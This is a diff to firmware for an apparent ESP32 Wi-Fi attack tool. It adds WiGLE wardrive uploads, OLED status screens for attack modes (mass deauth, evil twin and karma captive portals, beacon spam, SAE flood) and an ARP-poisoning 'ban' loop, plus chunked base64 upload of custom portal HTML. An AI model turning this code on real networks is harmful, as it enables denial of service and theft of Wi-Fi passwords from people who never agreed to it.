+        goto cleanup;
+    }
+
+    int ret = esp_tls_conn_http_new_sync(WIGLE_URL, &tls_cfg, tls);
+    if (ret < 0) {
+        MY_LOG_INFO(TAG, "  TLS connection failed");
+        goto cleanup;
+    }
+
+    if (wpasec_tls_write_all(tls, http_headers, hdr_len) < 0 ||
+        wpasec_tls_write_all(tls, body_start, start_len) < 0) {
+        MY_LOG_INFO(TAG, "  Failed to send request headers/body start");
+        goto cleanup;
+    }
+
+    while (1) {
+        size_t bytes_read = fread(chunk_buf, 1, CHUNK_SIZE, f);
+        if (bytes_read > 0) {
+            if (wpasec_tls_write_all(tls, (const char *)chunk_buf, (int)bytes_read) < 0) {
+                MY_LOG_INFO(TAG, "  Failed to send file chunk");
+                goto cleanup;
+            }
+        }
+        if (bytes_read < CHUNK_SIZE) {
+            if (ferror(f)) {
+                MY_LOG_INFO(TAG, "  Read error while streaming file");
+                goto cleanup;
+            }
+            break;
+        }
+    }
+
+    if (wpasec_tls_write_all(tls, body_end, end_len) < 0) {
+        MY_LOG_INFO(TAG, "  Failed to send multipart footer");
+        goto cleanup;
+    }
+
+    memset(resp_buf, 0, RESP_BUF_SZ);
+    int total_read = 0;
+    while (total_read < (int)RESP_BUF_SZ - 1) {
+        ret = esp_tls_conn_read(tls, resp_buf + total_read, RESP_BUF_SZ - 1 - total_read);
+        if (ret <= 0) break;
+        total_read += ret;
+    }
+    resp_buf[total_read] = '\0';
+
+    int status = 0;
+    if (total_read > 12 && strncmp(resp_buf, "HTTP/", 5) == 0) {
+        const char *sp = strchr(resp_buf, ' ');
+        if (sp) {
+            status = atoi(sp + 1);
+        }
+    }
+
+    bool duplicate = (strstr(resp_buf, "already") != NULL ||
+                      strstr(resp_buf, "Already") != NULL ||
+                      strstr(resp_buf, "duplicate") != NULL ||
+                      strstr(resp_buf, "Duplicate") != NULL);
+    bool success_false = (strstr(resp_buf, "\"success\":false") != NULL ||
+                          strstr(resp_buf, "\"success\": false") != NULL);
+
+    if (status == 200 || status == 201 || status == 202) {
+        if (duplicate) {
+            result = 1;
+            goto cleanup;
+        }
+        if (success_false) {
+            MY_LOG_INFO(TAG, "  WiGLE API returned success=false");
+            result = -1;
+            goto cleanup;
+        }
+        result = 0;
+        goto cleanup;
+    }
+
+    if (status == 401 || status == 403) {
+        result = 2;
+        goto cleanup;
+    }
+    if (status == 409) {
+        result = 1;
+        goto cleanup;
+    }
+
+    MY_LOG_INFO(TAG, "  HTTP error %d", status);
+    result = -1;
+
+cleanup:
+    if (f) {
+        fclose(f);
+    }
+    if (tls) {
+        esp_tls_conn_destroy(tls);
+    }
+    if (chunk_buf) {
+        free(chunk_buf);
+    }
+    if (http_headers) {
+        free(http_headers);
+    }
+    if (resp_buf) {
+        free(resp_buf);
+    }
+    return result;
+}
+
+static int cmd_wigle_key(int argc, char **argv) {
+    if (argc < 2) {
+        MY_LOG_INFO(TAG, "Usage: wigle_key set <api_name> <api_token> | wigle_key set <api_name:api_token> | wigle_key read");
+        return 0;
+    }
+
+    if (strcasecmp(argv[1], "read") == 0) {
+        if (wigle_api_name[0] == '\0' || wigle_api_token[0] == '\0') {
+            MY_LOG_INFO(TAG, "WiGLE key: not set");
+            MY_LOG_INFO(TAG, "Set via: wigle_key set <api_name> <api_token>");
+            MY_LOG_INFO(TAG, "Or place api_name:api_token in /sdcard/lab/wigle.txt and reboot.");
+        } else {
+            MY_LOG_INFO(TAG, "WiGLE key: %.4s****:%.4s****", wigle_api_name, wigle_api_token);
+        }
+        return 0;
+    }
+
+    if (strcasecmp(argv[1], "set") == 0) {
+        char api_name[WIGLE_KEY_MAX_LEN] = {0};
+        char api_token[WIGLE_KEY_MAX_LEN] = {0};
+
+        if (argc >= 4) {
+            if (strlen(argv[2]) >= sizeof(api_name) || strlen(argv[3]) >= sizeof(api_token)) {
+                MY_LOG_INFO(TAG, "Invalid key length (max %d chars each)", WIGLE_KEY_MAX_LEN - 1);
+                return 1;
+            }
+            snprintf(api_name, sizeof(api_name), "%s", argv[2]);
+            snprintf(api_token, sizeof(api_token), "%s", argv[3]);
+        } else if (argc == 3) {
+            if (!wigle_split_key_pair(argv[2], api_name, sizeof(api_name), api_token, sizeof(api_token))) {
+                MY_LOG_INFO(TAG, "Usage: wigle_key set <api_name> <api_token>");
+                MY_LOG_INFO(TAG, "Or:    wigle_key set <api_name:api_token>");
+                return 1;
+            }
+        } else {
+            MY_LOG_INFO(TAG, "Usage: wigle_key set <api_name> <api_token>");
+            MY_LOG_INFO(TAG, "Or:    wigle_key set <api_name:api_token>");
+            return 0;
+        }
+
+        if (api_name[0] == '\0' || api_token[0] == '\0') {
+            MY_LOG_INFO(TAG, "WiGLE API name/token must not be empty");
+            return 1;
+        }
+
+        if (wigle_save_key_to_nvs(api_name, api_token)) {
+            snprintf(wigle_api_name, sizeof(wigle_api_name), "%s", api_name);
+            snprintf(wigle_api_token, sizeof(wigle_api_token), "%s", api_token);
+            MY_LOG_INFO(TAG, "WiGLE key saved: %.4s****:%.4s****", wigle_api_name, wigle_api_token);
+        } else {
+            MY_LOG_INFO(TAG, "Failed to save WiGLE key to NVS");
+            return 1;
+        }
+        return 0;
+    }
+
+    MY_LOG_INFO(TAG, "Usage: wigle_key set <api_name> <api_token> | wigle_key set <api_name:api_token> | wigle_key read");
+    return 0;
+}
+
+static int cmd_wigle_upload(int argc, char **argv) {
+    oled_display_update_full("> WiGLE", "  Sending files", "  api.wigle.net", "  Uploading...");
+
+    wifi_ap_record_t ap_info;
+    if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK) {
+        MY_LOG_INFO(TAG, "WIFI NOT CONNECTED");
+        MY_LOG_INFO(TAG, "Not connected to any AP. Use 'wifi_connect' first.");
+        return 1;
+    }
+
+    if (wigle_api_name[0] == '\0' || wigle_api_token[0] == '\0') {
+        MY_LOG_INFO(TAG, "NO WIGLE CREDENTIALS");
+        MY_LOG_INFO(TAG, "Use 'wigle_key set <api_name> <api_token>' or /sdcard/lab/wigle.txt");
+        return 1;
+    }
+
+    esp_err_t ret = init_sd_card();
+    if (ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
+        return 1;
+    }
+
+    int uploaded = 0;
+    int skipped = 0;
+    int failed = 0;
+    bool auth_failed = false;
+
+    // If files are passed as args, upload only those selected files.
+    if (argc > 1) {
+        int total_files = argc - 1;
+        MY_LOG_INFO(TAG, "Uploading %d selected Wardrive file(s) to api.wigle.net...", total_files);
+
+        for (int i = 1; i < argc; i++) {
+            const char *arg = argv[i];
+            char filepath[280];
+            char upload_name[128];
+
+            if (!wigle_resolve_upload_target(arg, filepath, sizeof(filepath), upload_name, sizeof(upload_name))) {
+                MY_LOG_INFO(TAG, "[%d/%d] %s -> FAILED (invalid/missing file)", i, total_files, arg ? arg : "(null)");
+                failed++;
+                continue;
+            }
+
+            struct stat st;
+            long fsize = 0;
+            if (stat(filepath, &st) == 0) {
+                fsize = (long)st.st_size;
+            }
+
+            int result = wigle_upload_file(filepath, upload_name);
+            if (result == 0) {
+                MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> OK", i, total_files, upload_name, fsize);
+                uploaded++;
+            } else if (result == 1) {
+                MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> skipped (duplicate)", i, total_files, upload_name, fsize);
+                skipped++;
+            } else if (result == 2) {
+                MY_LOG_INFO(TAG, "NO WIGLE CREDENTIALS");
+                MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> AUTH FAILED", i, total_files, upload_name, fsize);
+                failed++;
+                auth_failed = true;
+                break;
+            } else {
+                MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> FAILED", i, total_files, upload_name, fsize);
+                failed++;
+            }
+
+            vTaskDelay(pdMS_TO_TICKS(250));
+        }
+
+        MY_LOG_INFO(TAG, "Done: %d uploaded, %d skipped, %d failed", uploaded, skipped, failed);
+        if (auth_failed) {
+            return 1;
+        }
+        return (failed > 0) ? 1 : 0;
+    }
+
+    DIR *dir = opendir("/sdcard/lab/wardrives");
+    if (dir == NULL) {
+        MY_LOG_INFO(TAG, "Failed to open /sdcard/lab/wardrives directory");
+        return 1;
+    }
+
+    struct dirent *entry;
+    int total_files = 0;
+    while ((entry = readdir(dir)) != NULL) {
+        if (entry->d_type == DT_DIR) {
+            continue;
+        }
+        if (wigle_is_upload_candidate(entry->d_name)) {
+            total_files++;
+        }
+    }
+
+    if (total_files == 0) {
+        MY_LOG_INFO(TAG, "No Wardrive files (.log/.txt/.csv) found in /sdcard/lab/wardrives/");
+        MY_LOG_INFO(TAG, "Done: 0 uploaded, 0 skipped, 0 failed");
+        closedir(dir);
+        return 0;
+    }
+
+    MY_LOG_INFO(TAG, "Uploading %d Wardrive file(s) to api.wigle.net...", total_files);
+
+    rewinddir(dir);
+    int current = 0;
+
+    while ((entry = readdir(dir)) != NULL) {
+        if (entry->d_type == DT_DIR) {
+            continue;
+        }
+        if (!wigle_is_upload_candidate(entry->d_name)) {
+            continue;
+        }
+
+        current++;
+        char filepath[280];
+        snprintf(filepath, sizeof(filepath), "/sdcard/lab/wardrives/%s", entry->d_name);
+
+        struct stat st;
+        long fsize = 0;
+        if (stat(filepath, &st) == 0) {
+            fsize = (long)st.st_size;
+        }
+
+        int result = wigle_upload_file(filepath, entry->d_name);
+        if (result == 0) {
+            MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> OK", current, total_files, entry->d_name, fsize);
+            uploaded++;
+        } else if (result == 1) {
+            MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> skipped (duplicate)", current, total_files, entry->d_name, fsize);
+            skipped++;
+        } else if (result == 2) {
+            MY_LOG_INFO(TAG, "NO WIGLE CREDENTIALS");
+            MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> AUTH FAILED", current, total_files, entry->d_name, fsize);
+            failed++;
+            auth_failed = true;
+            break;
+        } else {
+            MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> FAILED", current, total_files, entry->d_name, fsize);
+            failed++;
+        }
+
+        vTaskDelay(pdMS_TO_TICKS(400));
+    }
+
+    closedir(dir);
+
+    MY_LOG_INFO(TAG, "Done: %d uploaded, %d skipped, %d failed", uploaded, skipped, failed);
+    if (auth_failed) {
+        return 1;
+    }
+    return (failed > 0) ? 1 : 0;
+}
+
 // -------------------------------------------------
 
 static int cmd_start_sae_overflow(int argc, char **argv) {
     //avoid compiler warnings:
     (void)argc; (void)argv;
+    oled_display_update_full("> SAE Flood",
+        (g_selected_count > 0) ? (const char *)g_scan_results[g_selected_indices[0]].ssid : "  No target",
+        "  WPA3 Overflow", "  Flooding...");
     
     // Ensure WiFi is initialized
     if (!ensure_wifi_mode()) {
@@ -5718,6 +7008,7 @@ static int cmd_start_sae_overflow(int argc, char **argv) {
 static int cmd_start_blackout(int argc, char **argv) {
     //avoid compiler warnings:
     (void)argc; (void)argv;
+    oled_display_update_full("> Blackout Mode", "  All networks", "  Mass deauth", "  Active...");
     log_memory_info("start_blackout");
     
     // Ensure WiFi is initialized
@@ -5804,6 +7095,11 @@ static void boot_button_task(void *arg) {
 static int cmd_start_evil_twin(int argc, char **argv) {
     //avoid compiler warnings:
     (void)argc; (void)argv;
+    if (!onlyDeauth) {
+        char oled_target[48];
+        oled_build_target_summary(oled_target, sizeof(oled_target));
+        oled_display_update_full("> Evil Twin", oled_target, "  Captive portal", "  Waiting pwd..");
+    }
     log_memory_info("start_evil_twin");
     
     // Ensure WiFi is initialized
@@ -6082,6 +7378,13 @@ static int cmd_start_evil_twin(int argc, char **argv) {
  * Starts beacon spam attack with multiple fake SSIDs
  */
 static int cmd_start_beacon_spam(int argc, char **argv) {
+    {
+        char oled_l3[24];
+        snprintf(oled_l3, sizeof(oled_l3), "  %d fake SSIDs", argc - 1 > 0 ? argc - 1 : 0);
+        oled_display_update_full("> Beacon Spam",
+            argc >= 2 ? argv[1] : "  No SSIDs",
+            oled_l3, "  Broadcast...");
+    }
     if (argc < 2) {
         MY_LOG_INFO(TAG, "Usage: start_beacon_spam \"SSID1\" \"SSID2\" ...");
         return 1;
@@ -6203,6 +7506,7 @@ static int cmd_start_beacon_spam(int argc, char **argv) {
 
 static int cmd_stop(int argc, char **argv) {
     (void)argc; (void)argv;
+    oled_display_update_full("> STOPPED", "  All ops halted", "", "  > Idle");
     MY_LOG_INFO(TAG, "Stop command received - stopping all operations...");
     
     // Set global stop flags
@@ -6499,6 +7803,8 @@ static int cmd_stop(int argc, char **argv) {
     if (portal_active) {
         MY_LOG_INFO(TAG, "Stopping portal...");
         portal_active = false;
+        karma_mode_active = false;
+        rogueap_mode_active = false;
         
         // Stop DNS server task
         if (dns_server_task_handle != NULL) {
@@ -6653,7 +7959,9 @@ static const cli_hint_t k_cli_hints[] = {
     { "select_stations", " <MAC1> [MAC2] ..." },
     { "sniffer_debug", " <0|1>" },
     { "start_gps_raw", " [baud]" },
-    { "gps_set", " <m5|atgm>" },
+    { "gps_set", " <m5|atgm|external|cap>" },
+    { "set_gps_position", " <lat> <lon> [alt] [acc]" },
+    { "set_gps_position_cap", " <lat> <lon> [alt] [acc]" },
     { "start_portal", " <SSID>" },
     { "start_karma", " <index>" },
     { "vendor", " set <on|off> | read" },
@@ -6668,9 +7976,13 @@ static const cli_hint_t k_cli_hints[] = {
     { "list_dir", " [path]" },
     { "file_delete", " <path>" },
     { "select_html", " <index>" },
-    { "set_html", " <html>" },
+    { "set_html", " <base64_chunk>" },
+    { "set_html_begin", "" },
+    { "set_html_end", "" },
     { "wpasec_key", " set <key> | read" },
     { "wpasec_upload", "" },
+    { "wigle_key", " set <api_name> <api_token> | read" },
+    { "wigle_upload", " [file1 file2 ...]" },
 };
 
 static const char *lookup_cli_hint(const char *command) {
@@ -6860,6 +8172,9 @@ static int cmd_wifi_disconnect(int argc, char **argv) {
 }
 
 static int cmd_wifi_connect(int argc, char **argv) {
+    oled_display_update_full("> WiFi Connect",
+        argc >= 2 ? argv[1] : "  No SSID",
+        "  STA Mode", "  Connecting...");
     if (argc < 3 || argc > 9) {
         MY_LOG_INFO(TAG, "Usage: wifi_connect <SSID> <Password> [ota] [<IP> <Netmask> <GW> [DNS1] [DNS2]]");
         return 0;
@@ -6996,6 +8311,7 @@ static int cmd_wifi_connect(int argc, char **argv) {
         esp_netif_ip_info_t ip_info = { 0 };
         bool has_ip = wait_for_sta_ip_info(&ip_info, 5000);
         MY_LOG_INFO(TAG, "SUCCESS: Connected to '%s'", ssid);
+        save_evil_twin_password(ssid, password);
         if (has_ip) {
             if (use_static_ip) {
                 MY_LOG_INFO(TAG, "Static IP: " IPSTR ", Netmask: " IPSTR ", GW: " IPSTR,
@@ -7033,6 +8349,7 @@ static int cmd_wifi_connect(int argc, char **argv) {
 }
 
 static int cmd_ota_check(int argc, char **argv) {
+    oled_display_update_full("> OTA Update", "  Checking...", "  github.com", "  v" JANOS_VERSION " current");
     const char *tag = NULL;
     bool force_latest = false;
 
@@ -7270,6 +8587,7 @@ static int cmd_ota_boot(int argc, char **argv) {
 
 static int cmd_list_hosts(int argc, char **argv) {
     (void)argc; (void)argv;
+    oled_display_update_full("> ARP Scan", "  Scanning LAN", "", "  Working...");
     
     // Check if connected to AP
     wifi_ap_record_t ap_info;
@@ -7540,10 +8858,10 @@ static void arp_ban_task(void *pvParameters) {
     uint8_t fake_mac[6] = { 0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x00 };
     
     MY_LOG_INFO(TAG, "ARP ban: Poisoning both victim and router");
+    uint32_t arp_cycle = 0;
     
     while (arp_ban_active) {
         // Packet 1: To VICTIM - "Gateway IP is at fake MAC"
-        // Victim will try to send packets to gateway via fake MAC -> nowhere
         send_arp_reply(lwip_netif,
                        arp_ban_target_mac,       // Eth dst: victim
                        fake_mac,                  // Eth src: fake
@@ -7555,7 +8873,6 @@ static void arp_ban_task(void *pvParameters) {
         vTaskDelay(pdMS_TO_TICKS(50));  // Small delay between packets
         
         // Packet 2: To ROUTER - "Victim IP is at fake MAC"
-        // Router will try to send packets to victim via fake MAC -> nowhere
         send_arp_reply(lwip_netif,
                        arp_ban_gateway_mac,       // Eth dst: router
                        fake_mac,                  // Eth src: fake
@@ -7563,6 +8880,19 @@ static void arp_ban_task(void *pvParameters) {
                        arp_ban_target_ip.addr,    // ARP sender IP: victim (spoofed!)
                        arp_ban_gateway_mac,       // ARP target MAC: router
                        arp_ban_gateway_ip.addr);  // ARP target IP: router
+        
+        arp_cycle++;
+        if (arp_cycle % 4 == 0) {
+            char arp_l2[64], arp_l3[64], arp_l4[64];
+            snprintf(arp_l2, sizeof(arp_l2), "  %02X:%02X:%02X:%02X",
+                     arp_ban_target_mac[2], arp_ban_target_mac[3],
+                     arp_ban_target_mac[4], arp_ban_target_mac[5]);
+            snprintf(arp_l3, sizeof(arp_l3), "  %d.%d.%d.%d",
+                     ip4_addr1(&arp_ban_target_ip), ip4_addr2(&arp_ban_target_ip),
+                     ip4_addr3(&arp_ban_target_ip), ip4_addr4(&arp_ban_target_ip));
+            snprintf(arp_l4, sizeof(arp_l4), "  Poison #%lu", (unsigned long)arp_cycle);
+            oled_display_update_full("> ARP Ban", arp_l2, arp_l3, arp_l4);
+        }
         
         vTaskDelay(pdMS_TO_TICKS(450)); // Total ~500ms cycle
     }
@@ -7573,6 +8903,9 @@ static void arp_ban_task(void *pvParameters) {
 }
 
 static int cmd_arp_ban(int argc, char **argv) {
+    oled_display_update_full("> ARP Ban",
+        argc >= 2 ? argv[1] : "  No MAC",
+        "  Poison active", "  Blocking...");
     if (argc < 2) {
         MY_LOG_INFO(TAG, "Usage: arp_ban <MAC> [IP]");
         MY_LOG_INFO(TAG, "Example: arp_ban AA:BB:CC:DD:EE:FF 192.168.1.50");
@@ -7777,6 +9110,13 @@ static void packet_monitor_task(void *pvParameters) {
 
         printf("%" PRIu32 "pkts\n", diff);
         fflush(stdout);
+        
+        {
+            char pm_l3[64], pm_l4[64];
+            snprintf(pm_l3, sizeof(pm_l3), "  %" PRIu32 " pkts/sec", diff);
+            snprintf(pm_l4, sizeof(pm_l4), "  Total: %" PRIu32, current);
+            oled_display_update_full("> Pkt Monitor", "  Listening...", pm_l3, pm_l4);
+        }
     }
 
     packet_monitor_shutdown();
@@ -7787,6 +9127,11 @@ static void packet_monitor_task(void *pvParameters) {
 }
 
 static int cmd_packet_monitor(int argc, char **argv) {
+    {
+        char oled_ch[24];
+        snprintf(oled_ch, sizeof(oled_ch), "  Channel %s", argc >= 2 ? argv[1] : "?");
+        oled_display_update_full("> Pkt Monitor", oled_ch, "", "  Listening...");
+    }
     log_memory_info("packet_monitor");
     
     // Ensure WiFi is initialized
@@ -7953,7 +9298,11 @@ static void channel_view_task(void *pvParameters) {
     const TickType_t scan_delay = pdMS_TO_TICKS(CHANNEL_VIEW_SCAN_DELAY_MS);
     const TickType_t wait_slice = pdMS_TO_TICKS(100);
 
+    int cv_scan_num = 0;
+    
     while (channel_view_active && !operation_stop_requested) {
+        oled_display_update_full("> Channel View", "  Scanning...", "  All channels", "  Analyzing...");
+        
         esp_err_t err = start_background_scan(FAST_SCAN_MIN_TIME, FAST_SCAN_MAX_TIME);
         if (err != ESP_OK) {
             MY_LOG_INFO(TAG, "channel_view_error:scan_start %s", esp_err_to_name(err));
@@ -7976,6 +9325,24 @@ static void channel_view_task(void *pvParameters) {
             esp_wifi_scan_stop();
         } else {
             channel_view_publish_counts();
+            cv_scan_num++;
+            
+            // Find busiest channel
+            int busiest_ch = 0, busiest_count = 0;
+            for (uint16_t ci = 0; ci < g_scan_count; ci++) {
+                int ch = g_scan_results[ci].primary;
+                int cnt = 0;
+                for (uint16_t cj = 0; cj < g_scan_count; cj++) {
+                    if (g_scan_results[cj].primary == ch) cnt++;
+                }
+                if (cnt > busiest_count) { busiest_count = cnt; busiest_ch = ch; }
+            }
+            
+            char cv_l2[64], cv_l3[64], cv_l4[64];
+            snprintf(cv_l2, sizeof(cv_l2), "  Found %d APs", g_scan_count);
+            snprintf(cv_l3, sizeof(cv_l3), "  Busy: Ch%d (%d)", busiest_ch, busiest_count);
+            snprintf(cv_l4, sizeof(cv_l4), "  Scan #%d", cv_scan_num);
+            oled_display_update_full("> Channel View", cv_l2, cv_l3, cv_l4);
         }
 
         if (!channel_view_active || operation_stop_requested) {
@@ -8022,6 +9389,7 @@ static void channel_view_stop(void) {
 static int cmd_channel_view(int argc, char **argv) {
     (void)argc;
     (void)argv;
+    oled_display_update_full("> Channel View", "  WiFi spectrum", "  All channels", "  Analyzing...");
     log_memory_info("channel_view");
 
     // Ensure WiFi is initialized
@@ -8089,6 +9457,15 @@ static int cmd_channel_view(int argc, char **argv) {
 
 static int cmd_start_sniffer(int argc, char **argv) {
     (void)argc; (void)argv;
+    {
+        char oled_target[48];
+        if (g_selected_count > 0 && g_scan_done) {
+            oled_build_target_summary(oled_target, sizeof(oled_target));
+        } else {
+            snprintf(oled_target, sizeof(oled_target), "  All networks");
+        }
+        oled_display_update_full("> Sniffer", oled_target, "  Promiscuous", "  Capturing...");
+    }
     log_memory_info("start_sniffer");
     
     // Ensure WiFi is initialized
@@ -8193,6 +9570,11 @@ static int cmd_start_sniffer(int argc, char **argv) {
 
 static int cmd_start_sniffer_noscan(int argc, char **argv) {
     (void)argc; (void)argv;
+    {
+        char oled_l3[32];
+        snprintf(oled_l3, sizeof(oled_l3), "  %u networks", g_scan_count);
+        oled_display_update_full("> Sniffer", "  Prior scan data", oled_l3, "  Capturing...");
+    }
     log_memory_info("start_sniffer_noscan");
     
     // Ensure WiFi is initialized
@@ -8576,6 +9958,7 @@ static int cmd_sniffer_debug(int argc, char **argv) {
 
 static int cmd_start_sniffer_dog(int argc, char **argv) {
     (void)argc; (void)argv;
+    oled_display_update_full("> Sniff Dog", "  Hunt AP-STA", "  Auto deauth", "  Active...");
     log_memory_info("start_sniffer_dog");
     
     // Ensure WiFi is initialized
@@ -8652,6 +10035,7 @@ static int cmd_start_sniffer_dog(int argc, char **argv) {
 }
 
 static int cmd_deauth_detector(int argc, char **argv) {
+    oled_display_update_full("> Deauth Detect", "  Monitoring...", "  All channels", "  Passive scan");
     log_memory_info("deauth_detector");
     
     // Ensure WiFi is initialized
@@ -8894,6 +10278,7 @@ static int cmd_download(int argc, char **argv) {
 static int cmd_reboot(int argc, char **argv)
 {
     (void)argc; (void)argv;
+    oled_display_update_full("> Reboot", "  Unmount SD...", "", "  Restarting...");
     MY_LOG_INFO(TAG,"Restart...");
     safe_restart();  // unmount SD card before restart
     return 0;
@@ -9194,9 +10579,60 @@ static int cmd_vendor(int argc, char **argv) {
     return 1;
 }
 
+static int cmd_display(int argc, char **argv)
+{
+    if (argc < 2) {
+        MY_LOG_INFO(TAG, "Usage: display set <auto|ssd1306|sh1107|sh1106|unit_lcd> | display read");
+        return 1;
+    }
+
+    if (strcasecmp(argv[1], "read") == 0) {
+        display_type_t detected = oled_display_get_type();
+        const char *detected_name = "none";
+        switch (detected) {
+            case DISPLAY_SSD1306: detected_name = "ssd1306"; break;
+            case DISPLAY_SH1107: detected_name = "sh1107"; break;
+            case DISPLAY_SH1106: detected_name = "sh1106"; break;
+            case DISPLAY_UNIT_LCD: detected_name = "unit_lcd"; break;
+            case DISPLAY_NONE:
+            default: detected_name = "none"; break;
+        }
+        MY_LOG_INFO(TAG, "Display mode: %s", display_mode_to_str(display_forced_mode));
+        MY_LOG_INFO(TAG, "Detected now: %s (addr raw 0x%02X / 7-bit 0x%02X)",
+                    detected_name,
+                    (int)oled_display_get_i2c_addr_raw(),
+                    (int)oled_display_get_i2c_addr_7bit());
+        return 0;
+    }
+
+    if (strcasecmp(argv[1], "set") == 0) {
+        if (argc < 3) {
+            MY_LOG_INFO(TAG, "Usage: display set <auto|ssd1306|sh1107|sh1106|unit_lcd>");
+            return 1;
+        }
+        display_type_t mode = DISPLAY_NONE;
+        if (!display_mode_from_str(argv[2], &mode)) {
+            MY_LOG_INFO(TAG, "Unknown mode '%s'. Use: auto|ssd1306|sh1107|sh1106|unit_lcd", argv[2]);
+            return 1;
+        }
+        display_forced_mode = mode;
+        oled_display_set_forced_type(display_forced_mode);
+        display_mode_save_to_nvs(display_forced_mode);
+        MY_LOG_INFO(TAG, "Display mode saved: %s", display_mode_to_str(display_forced_mode));
+        MY_LOG_INFO(TAG, "Reboot required to re-initialize display driver");
+        return 0;
+    }
+
+    MY_LOG_INFO(TAG, "Usage: display set <auto|ssd1306|sh1107|sh1106|unit_lcd> | display read");
+    return 1;
+}
+
 // Command: start_karma - Starts portal with SSID from probe list
 static int cmd_start_karma(int argc, char **argv)
 {
+    oled_display_update_full("> Karma Attack",
+        argc >= 2 ? argv[1] : "  No index",
+        "  Fake AP up", "  Capturing...");
     if (argc < 2) {
         MY_LOG_INFO(TAG, "Usage: start_karma <index>");
         MY_LOG_INFO(TAG, "Example: start_karma 2");
@@ -9252,6 +10688,14 @@ static int cmd_start_karma(int argc, char **argv)
     }
     
     MY_LOG_INFO(TAG, "Starting Karma attack with SSID: %s", selected_ssid);
+    
+    {
+        char karma_l2[64];
+        snprintf(karma_l2, sizeof(karma_l2), ">> %s", selected_ssid);
+        oled_display_update_full("> Karma Attack", karma_l2, "  Fake AP up", "  Capturing...");
+    }
+    
+    karma_mode_active = true;
     
     // Prepare arguments for cmd_start_portal
     char *portal_argv[2];
@@ -9643,44 +11087,140 @@ static int cmd_select_html(int argc, char **argv)
     return 0;
 }
 
-// Command: set_html - Sets custom HTML from command line argument
+// ----------------------------------------------------------------
+// Chunked base64 HTML transfer protocol:
+//   set_html_begin           — clear buffer, start accumulating
+//   set_html <base64_chunk>  — append chunk to accumulator
+//   set_html_end             — decode accumulated base64 → custom_portal_html
+// ----------------------------------------------------------------
+
+// Command: set_html_begin — initialise the base64 accumulator
+static int cmd_set_html_begin(int argc, char **argv)
+{
+    (void)argc; (void)argv;
+
+    // Free any previous accumulator
+    if (html_b64_buf) {
+        heap_caps_free(html_b64_buf);
+        html_b64_buf = NULL;
+    }
+    html_b64_len = 0;
+    html_b64_cap = HTML_B64_ALLOC;
+    // Allocate in PSRAM to avoid DRAM heap fragmentation
+    html_b64_buf = (char *)heap_caps_malloc(html_b64_cap, MALLOC_CAP_SPIRAM);
+    if (!html_b64_buf) {
+        // Fallback to internal RAM if no PSRAM
+        html_b64_buf = (char *)malloc(html_b64_cap);
+    }
+    if (!html_b64_buf) {
+        MY_LOG_INFO(TAG, "set_html_begin: malloc failed (%u)", (unsigned)html_b64_cap);
+        html_b64_active = false;
+        return 1;
+    }
+    html_b64_buf[0] = '\0';
+    html_b64_active = true;
+    MY_LOG_INFO(TAG, "set_html_begin: ready to receive base64 chunks (%uKB buffer)",
+                (unsigned)(html_b64_cap / 1024));
+    return 0;
+}
+
+// Command: set_html <chunk> — append a base64 chunk to the accumulator
 static int cmd_set_html(int argc, char **argv)
 {
     if (argc < 2) {
-        MY_LOG_INFO(TAG, "Usage: set_html <html_string>");
-        MY_LOG_INFO(TAG, "Example: set_html <!DOCTYPE html><html>...</html>");
+        MY_LOG_INFO(TAG, "Usage: set_html <base64_chunk>");
+        MY_LOG_INFO(TAG, "       Use set_html_begin first, then set_html chunks, then set_html_end");
         return 1;
     }
-    
-    // Concatenate all arguments (HTML may contain spaces)
-    size_t total_len = 0;
-    for (int i = 1; i < argc; i++) {
-        total_len += strlen(argv[i]) + 1; // +1 for space
+
+    if (!html_b64_active || !html_b64_buf) {
+        MY_LOG_INFO(TAG, "set_html: no transfer in progress — call set_html_begin first");
+        return 1;
     }
-    
-    // Free previous custom HTML if exists
-    if (custom_portal_html != NULL) {
+
+    // Concatenate all argv fragments (esp_console may split on spaces)
+    for (int i = 1; i < argc; i++) {
+        size_t frag_len = strlen(argv[i]);
+        if (html_b64_len + frag_len + 1 > html_b64_cap) {
+            MY_LOG_INFO(TAG, "set_html: buffer full (%u/%u bytes)",
+                        (unsigned)html_b64_len, (unsigned)html_b64_cap);
+            return 1;
+        }
+        memcpy(html_b64_buf + html_b64_len, argv[i], frag_len);
+        html_b64_len += frag_len;
+        html_b64_buf[html_b64_len] = '\0';
+    }
+    return 0;   // silent success — avoid flooding serial with ACKs
+}
+
+// Command: set_html_end — decode accumulated base64 and set custom_portal_html
+static int cmd_set_html_end(int argc, char **argv)
+{
+    (void)argc; (void)argv;
+
+    if (!html_b64_active || !html_b64_buf || html_b64_len == 0) {
+        MY_LOG_INFO(TAG, "set_html_end: no data received — nothing to decode");
+        html_b64_active = false;
+        return 1;
+    }
+    html_b64_active = false;
+
+    MY_LOG_INFO(TAG, "set_html_end: decoding %u base64 bytes...", (unsigned)html_b64_len);
+
+    // Calculate decoded size
+    size_t decoded_len = 0;
+    int ret = mbedtls_base64_decode(NULL, 0, &decoded_len,
+                                     (const unsigned char *)html_b64_buf, html_b64_len);
+    // mbedtls returns MBEDTLS_ERR_BASE64_BUFFER_TOO_SMALL when just probing size — that's OK
+    if (decoded_len == 0) {
+        MY_LOG_INFO(TAG, "set_html_end: base64 decode size probe failed");
+        heap_caps_free(html_b64_buf); html_b64_buf = NULL; html_b64_len = 0;
+        return 1;
+    }
+    if (decoded_len > HTML_MAX_DECODED) {
+        MY_LOG_INFO(TAG, "set_html_end: HTML too large (%u bytes, max %u)",
+                    (unsigned)decoded_len, (unsigned)HTML_MAX_DECODED);
+        heap_caps_free(html_b64_buf); html_b64_buf = NULL; html_b64_len = 0;
+        return 1;
+    }
+
+    // Allocate decoded buffer in PSRAM (+1 for NUL)
+    char *decoded = (char *)heap_caps_malloc(decoded_len + 1, MALLOC_CAP_SPIRAM);
+    if (!decoded) {
+        decoded = (char *)malloc(decoded_len + 1);
+    }
